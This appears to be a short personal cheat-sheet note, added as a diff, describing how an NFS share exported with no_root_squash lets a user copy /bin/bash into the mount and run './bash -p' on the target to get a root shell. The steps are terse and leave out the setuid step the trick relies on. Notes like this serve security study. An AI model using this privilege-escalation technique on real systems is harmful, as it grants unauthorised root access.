@@ -1,0 +1,11 @@
+**no_root_squash**
+
+**we can add bash file to nfs in our pc as root   **
+
+==**cp /bin/bash .    <to nfs mount dir>**==
+
+==**and it will show up in target pc as root**==
+
+==**then       ./bash -p**==
+
+==**to get root**==
